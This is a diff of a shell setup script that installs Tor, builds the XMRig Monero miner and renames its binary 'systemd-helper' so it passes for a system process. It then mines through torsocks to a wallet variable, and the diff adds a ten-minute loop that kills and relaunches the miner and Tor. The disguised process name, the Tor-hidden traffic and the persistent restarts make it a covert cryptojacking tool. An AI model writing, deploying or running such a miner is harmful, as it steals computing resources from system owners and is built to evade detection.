@@ -90,25 +90,20 @@ echo "[+] Starting setup..."
 
 install_dependencies() {
     apt update -y
-    sudo apt install tor curl net-tools -y
+    apt install -y sudo curl tor net-tools
 }
 
 start_tor() {
-    mkdir -p /home/master/.tor
     echo "[+] Restarting Tor with new circuit..."
-    sudo pkill tor >/dev/null 2>&1
-    sudo service tor restart
+    pkill tor >/dev/null 2>&1
+    service tor restart >/dev/null 2>&1 || tor &
     sleep 10
 }
 
 test_tor() {
-    mkdir -p /home/master/.tor
-    sudo service tor start
-    tor &
-    torsocks curl https://check.torproject.org
-    echo "[+] Current Tor IP:"
-    curl --socks5 127.0.0.1:9050 https://ifconfig.me || echo "[!] Tor failed."
-    echo ""
+    echo "[+] Checking Tor connection..."
+    torsocks curl -s https://check.torproject.org | grep -q "Congratulations" && \
+        echo "[✓] Tor is working." || echo "[!] Tor check failed."
 }
 
 build_xmrig() {
@@ -117,39 +112,43 @@ build_xmrig() {
     mv xmrig-6.21.0 xmrig
     cd xmrig
     mv xmrig systemd-helper
-    rm -rf ../xmrig.tar.gz
+    rm -f ../xmrig.tar.gz
 }
 
 start_mining() {
-    while true; do
-        echo "[+] Launching miner via Tor..."
-        torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1 2>&1 | tee log.txt
-
-        if grep -qE "PERROR torsocks\[.*\]: socks5 libc connect: Connection refused" log.txt || \
-           grep -q "connect error: \"connection refused\"" log.txt || \
-           grep -q "We tried for 15 seconds to connect" log.txt; then
-            echo "[!] Detected Tor/network failure. Restarting entire script..."
-            cd ..
-            bash $0
-            exit
-        else
-            echo "[✓] Mining exited cleanly or by user."
-            break
-        fi
-    done
+    cd xmrig
+    echo "[+] Starting mining..."
+    torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1 2>&1 | tee log.txt &
+    MINER_PID=$!
 }
 
-# --- MAIN ---
-if [ ! -f "./xmrig/systemd-helper" ]; then
-    install_dependencies
-    build_xmrig
-fi
+cleanup_previous() {
+    echo "[*] Cleaning up previous miner and Tor..."
+    pkill -f systemd-helper
+    pkill -f tor
+    sleep 2
+}
 
-start_tor
-test_tor
+# --- MAIN LOOP ---
+while true; do
+    echo "=============================="
+    echo "[🕒] Starting 10-min mining cycle"
+    echo "=============================="
 
-cd xmrig
-start_mining
+    cleanup_previous
+
+    if [ ! -f "./xmrig/systemd-helper" ]; then
+        install_dependencies
+        build_xmrig
+    fi
+
+    start_tor
+    test_tor
+    start_mining
+
+    echo "[⏳] Sleeping for 10 minutes..."
+    sleep 600
+done
 EOM
 
 # Make script executable and run it
